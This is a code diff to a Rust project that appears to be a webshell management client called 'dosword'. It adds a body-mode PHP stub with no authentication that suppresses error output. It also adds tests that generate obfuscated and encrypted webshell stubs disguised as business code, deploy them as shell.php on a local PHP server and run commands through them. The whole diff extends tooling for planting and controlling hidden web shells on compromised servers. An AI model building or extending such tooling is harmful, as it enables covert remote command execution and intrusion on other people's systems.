@@ -211,7 +211,12 @@ impl PhpProtocol {
     }
 
     /// 构建鉴权前缀（密码参数名随编码器业务伪装模板变化：token / k）。
+    /// body 模式（php_stream）载荷不经表单传输，stub 无鉴权，前缀不包含密码比较。
     fn build_prefix(encoder: &dyn PayloadEncoder, password: &str) -> String {
+        if encoder.body_mode() {
+            return "@ini_set(\"display_errors\",\"0\");@error_reporting(0);@set_time_limit(0);"
+                .to_string();
+        }
         let (key_param, _) = encoder.form_params();
         Self::build_code(
             TEMPLATE_PREFIX,
@@ -957,7 +962,16 @@ mod tests {
                 let x = {
                     let x = param("x");
                     let data = param("data");
-                    if !x.is_empty() { x } else { data }
+                    if !x.is_empty() {
+                        x
+                    } else if !data.is_empty() {
+                        data
+                    } else if !body.is_empty() {
+                        // body 直传模式（php_stream）：整个请求体即载荷
+                        body.to_string()
+                    } else {
+                        String::new()
+                    }
                 };
                 let code = {
                     // 支持多种编码：裸 base64 / XOR / AES-128-ECB / CHAR / OBFUSCATE
@@ -1351,6 +1365,40 @@ mod tests {
     }
 
     #[test]
+    fn real_php_all_encoders_round_trip() {
+        // 每个编码器的生成 stub 都做真实执行验证（防止模板双重调用等 bug 漏网）
+        let encoders = [
+            "xor_base64",
+            "base64",
+            "aes128_ecb",
+            "aes128_cbc",
+            "des",
+            "char",
+            "php_obfuscate",
+            "php_stream",
+        ];
+        let settings = settings();
+        for encoder_id in encoders {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret") else {
+                eprintln!("跳过 {encoder_id}：未检测到 php 可执行文件");
+                continue;
+            };
+            let mut profile = profile(&url);
+            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            let result = (|| -> Result<String, ProtocolError> {
+                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+                let output = PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
+                Ok(output.stdout)
+            })();
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+            let stdout = result.unwrap_or_else(|error| panic!("{encoder_id} 真实执行应成功：{error}"));
+            assert_eq!(stdout.trim(), "enc-ok", "{encoder_id} 输出不符");
+        }
+    }
+
+    #[test]
     fn real_php_sqlite_db_round_trip() {
         // 真实闭环：php -S + stub 上通过 pdo_sqlite 执行建表/插入/查询
         let Some((url, dir, mut child)) = spawn_php_server() else {
@@ -1409,19 +1457,19 @@ mod tests {
 
     // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---
 
-    /// 在本机临时目录写入 stub 并起 `php -S`，返回 (endpoint, 清理函数)。
-    /// 若无 php 可执行则返回 None（跳过测试）。
-    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
+    /// 在本机临时目录写入指定编码器生成的 stub 并起 `php -S`，
+    /// 返回 (endpoint, 临时目录, 进程)。若无 php 可执行则返回 None（跳过测试）。
+    /// body 模式编码器（php_stream）自动加 `allow_url_include=1`。
+    fn spawn_php_server_with(encoder_id: &str, password: &str) -> Option<(String, std::path::PathBuf, std::process::Child)> {
         let php = std::process::Command::new("php").arg("-v").output().ok()?;
         if !php.status.success() {
             return None;
         }
+        let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
         let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
         std::fs::create_dir_all(&dir).ok()?;
-        // 部署 SDK 生成的业务伪装 stub（顺带验证生成器产物的真实可运行性）
-        let stub = dosword_sdk::encoder::Base64Encoder
-            .stub("php", "secret")
-            .ok()?;
+        // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
+        let stub = encoder.stub("php", password).ok()?;
         std::fs::write(dir.join("shell.php"), stub).ok()?;
         std::fs::create_dir_all(dir.join("www")).ok()?;
         std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;
@@ -1431,7 +1479,11 @@ mod tests {
             let listener = TcpListener::bind("127.0.0.1:0").unwrap();
             listener.local_addr().unwrap().port()
         };
-        let child = std::process::Command::new("php")
+        let mut command = std::process::Command::new("php");
+        if encoder.body_mode() {
+            command.arg("-d").arg("allow_url_include=1");
+        }
+        let child = command
             .arg("-S")
             .arg(format!("127.0.0.1:{port}"))
             .arg("-t")
@@ -1449,6 +1501,10 @@ mod tests {
             std::thread::sleep(std::time::Duration::from_millis(100));
         }
         Some((url, dir, child))
+    }
+
+    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
+        spawn_php_server_with("base64", "secret")
     }
 
     #[test]
